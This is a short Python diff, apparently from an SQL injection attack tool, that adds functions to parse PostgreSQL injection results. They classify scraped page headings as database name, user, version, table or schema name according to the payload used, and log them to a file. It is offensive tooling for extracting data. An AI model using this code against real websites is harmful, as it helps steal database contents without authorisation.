@@ -37,3 +37,41 @@ def extract_data(response, file, payload, vulnerable_field):
                     written_values.add(found)
                 else:
                     print(f"{Fore.YELLOW}[-] Data already written to file: {file_name}{Style.RESET_ALL}")
+
+
+def get_psql_fields(response):
+    soup = BeautifulSoup(response.content, 'html.parser')
+    return soup.find_all("h2")
+
+
+def extract_psql_data(response, file, payload, vulnerable_filed):
+    file_name = file
+    with open(file, "+a") as file:
+        file.seek(0)
+        fields = get_psql_fields(response)
+        print(f"{Fore.LIGHTBLUE_EX}[*] Vulnerable field: {vulnerable_filed}{Style.RESET_ALL}")
+        written_values = set(file.read().splitlines())
+        file.write(f"[*] Payload: {payload}" + '\n')
+        file.write(f"[*] Vulnerable field: {vulnerable_filed}" + '\n')
+        for field in fields:
+            text = field.get_text(separator=" ").strip()
+            found = None
+            if re.search(r'\b(current_database|schema_name)\b', payload, re.IGNORECASE):
+                found = f"Database: {text}"
+            elif re.search(r'\b(current_user|USER\(\))\b', payload, re.IGNORECASE):
+                found = f"User: {text}"
+            elif re.search(r'\b(version|@@version)\b', payload, re.IGNORECASE):
+                found = f"Version: {text}"
+            elif re.search(r'\btable_name\b', payload, re.IGNORECASE):
+                found = f"Table name: {text}"
+            elif re.search(r'\bschema_name\b', payload, re.IGNORECASE):
+                found = f"Schema name: {text}"
+            else:
+                print(f"{Fore.YELLOW}[-] Unmatched field:{Style.RESET_ALL} {text}")
+            if found:
+                if found not in written_values:
+                    print(f"{Fore.GREEN}[*] Found new data! Writing to file{Style.RESET_ALL}")
+                    file.write(found + '\n')
+                    written_values.add(found)
+                else:
+                    print(f"{Fore.YELLOW}[-] Data already written to file: {file_name}{Style.RESET_ALL}")
